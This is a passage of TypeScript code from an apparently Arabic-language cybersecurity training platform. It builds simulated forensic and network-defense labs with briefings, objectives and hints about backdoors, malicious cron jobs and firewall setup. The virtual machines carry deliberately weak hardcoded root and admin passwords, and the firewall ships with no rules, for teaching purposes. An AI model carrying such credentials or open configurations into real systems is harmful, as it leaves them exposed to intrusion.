    briefing: `🔍 مرحباً بك في مختبر التحليل الجنائي الرقمي!\n\n📋 المهمة:\nتم اكتشاف اختراق على هذا الخادم. مهمتك التحقيق!\n\n🔍 الخادم المخترق - 192.168.1.50\n👤 حسابك: forensic (صلاحيات sudo)\n\n🎯 أهدافك:\n1. حدد كيف دخل المهاجم\n2. اكتشف ماذا فعل بعد الدخول\n3. ابحث عن البرمجيات الخبيثة المزروعة\n4. حدد البيانات المسروقة\n5. اكتب تقريراً بالنتائج\n\n💡 ابدأ بـ: cat /var/log/auth.log\n\n⚡ كل أثر يروي قصة — اتبع الأدلة!`,
    objectives: [
      "حلّل سجل auth.log لاكتشاف طريقة الاختراق",
      "حدد عنوان IP المهاجم",
      "اكتشف الباب الخلفي (backdoor) المزروع",
      "حدد البيانات التي تم سرقتها",
      "اعثر على مهمة cron الخبيثة",
      "حلّل سجل keylogger للمعلومات المسروقة",
    ],
    hints: [
      "ابدأ بـ auth.log — ابحث عن محاولات فاشلة ثم ناجحة",
      "IP المهاجم: 45.33.32.156",
      "ابحث في /tmp عن ملفات مخفية (ls -la /tmp)",
      "تحقق من crontab: cat /etc/crontab",
      "ملف syslog يحتوي أدلة مهمة",
    ],
    network, machines: [compromised],
    difficulty: req.difficulty || "intermediate", category: "defensive",
    createdBy: "student", createdAt: Date.now(),
  };
}

function buildNetworkDefenseEnv(req: EnvironmentSetupRequest, network: { subnet: string; netmask: string; gateway: string; dns: string }): CyberEnvironment {
  const machinesInfo = [
    { hostname: "firewall", ip: "192.168.1.1" },
    { hostname: "web-server", ip: "192.168.1.50" },
    { hostname: "internal-server", ip: "192.168.1.60" },
  ];
  const networkHosts = buildNetworkHosts(machinesInfo);

  const firewallFS = buildKaliFS("firewall", "192.168.1.1", networkHosts);
  if (firewallFS.children?.etc?.children) {
    firewallFS.children.etc.children["iptables"] = { type: "dir", children: {
      "rules.v4": { type: "file", content: "*filter\n:INPUT ACCEPT [0:0]\n:FORWARD ACCEPT [0:0]\n:OUTPUT ACCEPT [0:0]\n# WARNING: No firewall rules configured!\nCOMMIT" },
    }};
    firewallFS.children.etc.children["ufw"] = { type: "dir", children: {
      "ufw.conf": { type: "file", content: "ENABLED=no\nLOGLEVEL=low" },
    }};
  }

  const firewall: VirtualMachine = {
    id: "fw-1", hostname: "firewall", ip: "192.168.1.1", mac: randomMAC(),
    os: "ubuntu-server", osLabel: "Ubuntu Server 22.04", role: "router",
    users: [
      { username: "root", password: "firewall!", isRoot: true, home: "/root", shell: "/bin/bash", groups: ["root"], uid: 0 },
      { username: "netadmin", password: "netadmin", isRoot: false, home: "/home/netadmin", shell: "/bin/bash", groups: ["netadmin", "sudo"], uid: 1000 },
    ],
    currentUser: "netadmin", filesystem: firewallFS,
    services: [makeSSHService()], tools: ["iptables", "ufw", "tcpdump", "nmap", "fail2ban", "snort"],
    isAccessible: true, description: "Network firewall/router", descriptionAr: "جدار الحماية / الراوتر",
    icon: "🛡️", processes: makeProcesses("ubuntu", [makeSSHService()]),
    env: { HOME: "/home/netadmin", USER: "netadmin", SHELL: "/bin/bash", PATH: "/usr/local/bin:/usr/bin:/bin", TERM: "xterm-256color" },
  };

  const webSvcs = [makeSSHService(), makeHTTPService()];
  const webServer: VirtualMachine = {
    id: "web-1", hostname: "web-server", ip: "192.168.1.50", mac: randomMAC(),
    os: "ubuntu-server", osLabel: "Ubuntu Server 22.04", role: "server",
    users: [{ username: "root", password: "webroot", isRoot: true, home: "/root", shell: "/bin/bash", groups: ["root"], uid: 0 },
            { username: "webadmin", password: "webadmin", isRoot: false, home: "/home/webadmin", shell: "/bin/bash", groups: ["webadmin", "sudo"], uid: 1000 }],
    currentUser: "webadmin", filesystem: buildUbuntuServerFS("web-server", "192.168.1.50", networkHosts, webSvcs),
    services: webSvcs, tools: [], isAccessible: false,
    description: "Public-facing web server", descriptionAr: "خادم الويب العام",
    icon: "🌐", processes: makeProcesses("ubuntu", webSvcs),
    env: { HOME: "/home/webadmin", USER: "webadmin", SHELL: "/bin/bash", PATH: "/usr/local/bin:/usr/bin:/bin", TERM: "xterm-256color" },
  };

  const intSvcs = [makeSSHService(), makeMySQLService()];
  const internalServer: VirtualMachine = {
    id: "int-1", hostname: "internal-server", ip: "192.168.1.60", mac: randomMAC(),
    os: "ubuntu-server", osLabel: "Ubuntu Server 22.04", role: "server",
    users: [{ username: "root", password: "introot", isRoot: true, home: "/root", shell: "/bin/bash", groups: ["root"], uid: 0 },
            { username: "dbadmin", password: "dbadmin", isRoot: false, home: "/home/dbadmin", shell: "/bin/bash", groups: ["dbadmin", "sudo"], uid: 1000 }],
    currentUser: "dbadmin", filesystem: buildUbuntuServerFS("internal-server", "192.168.1.60", networkHosts, intSvcs),
    services: intSvcs, tools: [], isAccessible: false,
    description: "Internal database server", descriptionAr: "خادم قاعدة البيانات الداخلي",
    icon: "🗄️", processes: makeProcesses("ubuntu", intSvcs),
    env: { HOME: "/home/dbadmin", USER: "dbadmin", SHELL: "/bin/bash", PATH: "/usr/local/bin:/usr/bin:/bin", TERM: "xterm-256color" },
  };

  return {
    id: genId(), name: "Network Defense Lab", nameAr: "مختبر أمن الشبكات والدفاع",
    description: "Configure firewalls and IDS to protect the network",
    briefing: `🛡️ مرحباً بك في مختبر أمن الشبكات!\n\n📋 المهمة:\nأنت مسؤول أمن الشبكة. الشبكة حالياً غير محمية!\n\n🛡️ جدار الحماية - 192.168.1.1 (أنت هنا)\n🌐 خادم الويب - 192.168.1.50\n🗄️ خادم قاعدة البيانات - 192.168.1.60\n\n🎯 أهدافك:\n1. قيّم الوضع الأمني الحالي\n2. أعد قواعد iptables/ufw لحماية الشبكة\n3. اسمح فقط بالمنافذ الضرورية\n4. احمِ خادم قاعدة البيانات من الوصول الخارجي\n5. راقب حركة المرور المشبوهة\n\n💡 ابدأ بـ: sudo iptables -L -n\n\n⚡ الدفاع الجيد يبدأ بفهم الشبكة!`,
    objectives: [
      "افحص قواعد الجدار الناري الحالية",
      "أعد قواعد لحماية خادم قاعدة البيانات",
      "اسمح فقط بـ HTTP/HTTPS لخادم الويب",
      "منع الوصول المباشر لقاعدة البيانات من الخارج",
      "فعّل التسجيل للاتصالات المرفوضة",
    ],
    hints: [
      "sudo iptables -L -n يعرض القواعد الحالية",
      "sudo ufw enable لتفعيل الجدار الناري",
      "ufw allow 22/tcp للسماح بـ SSH",
      "tcpdump -i eth0 لمراقبة الحركة",
    ],
    network, machines: [firewall, webServer, internalServer],
    difficulty: req.difficulty || "intermediate", category: "defensive",
    createdBy: "student", createdAt: Date.now(),
  };
}

export function generateAIEnvironment(config: {
  machines: Array<{
    hostname: string; ip: string; os: OSType; role: MachineRole;
    users: VMUser[]; services: string[]; tools: string[];
    accessible: boolean; description: string;
  }>;
  name: string; nameAr: string; briefing: string;
  objectives: string[]; hints: string[];
  difficulty: 'beginner' | 'intermediate' | 'advanced';
}): CyberEnvironment {
  const network = { subnet: "192.168.1.0/24", netmask: "255.255.255.0", gateway: "192.168.1.1", dns: "8.8.8.8" };
  const machinesInfo = config.machines.map(m => ({ hostname: m.hostname, ip: m.ip }));
  const networkHosts = buildNetworkHosts(machinesInfo);

  const machines: VirtualMachine[] = config.machines.map((m, i) => {
    const serviceObjs: VMService[] = [];
    for (const svc of m.services) {
      if (svc === "ssh") serviceObjs.push(makeSSHService());
      if (svc === "http") serviceObjs.push(makeHTTPService());
      if (svc === "ftp") serviceObjs.push(makeFTPService());
      if (svc === "mysql") serviceObjs.push(makeMySQLService());
      if (svc === "smb") serviceObjs.push(makeSMBService());
      if (svc === "rdp") serviceObjs.push(makeRDPService());
      if (svc === "smtp") serviceObjs.push(makeSMTPService());
      if (svc === "dns") serviceObjs.push(makeDNSService());
    }

    let fs: FSNode;
    if (m.os === "kali-linux") {
      fs = buildKaliFS(m.hostname, m.ip, networkHosts);
    } else if (m.os.includes("windows")) {
      fs = buildWindowsFS(m.hostname, m.ip);
    } else {
      fs = buildUbuntuServerFS(m.hostname, m.ip, networkHosts, serviceObjs);
    }

    const isWin = m.os.includes("windows");
    const osLabels: Record<string, string> = {
      "kali-linux": "Kali Linux 2024.1", "ubuntu-server": "Ubuntu Server 22.04 LTS",
      "ubuntu-desktop": "Ubuntu Desktop 22.04", "centos": "CentOS 8 Stream",
      "debian": "Debian 12 Bookworm", "windows-10": "Windows 10 Pro",
      "windows-server": "Windows Server 2019",
    };

    return {
      id: `vm-${i}`, hostname: m.hostname, ip: m.ip, mac: randomMAC(),
      os: m.os, osLabel: osLabels[m.os] || m.os, role: m.role,
      users: m.users, currentUser: m.users[0]?.username || "user",
      filesystem: fs, services: serviceObjs, tools: m.tools,
      isAccessible: m.accessible, description: m.description, descriptionAr: m.description,
      icon: isWin ? "🪟" : m.os === "kali-linux" ? "🐧" : "🖥️",
      processes: makeProcesses(m.os, serviceObjs),
      env: isWin
        ? { USERPROFILE: `C:\\Users\\${m.users[0]?.username || "User"}`, USERNAME: m.users[0]?.username || "User", COMSPEC: "C:\\Windows\\System32\\cmd.exe" } as Record<string, string>
        : { HOME: m.users[0]?.home || "/home/user", USER: m.users[0]?.username || "user", SHELL: "/bin/bash", PATH: "/usr/local/bin:/usr/bin:/bin", TERM: "xterm-256color" } as Record<string, string>,
    };
  });

  return {
    id: genId(), name: config.name, nameAr: config.nameAr,
    description: config.name, briefing: config.briefing,
    objectives: config.objectives, hints: config.hints,
    network, machines,
    difficulty: config.difficulty, category: "custom",
    createdBy: "ai", createdAt: Date.now(),
  };
}
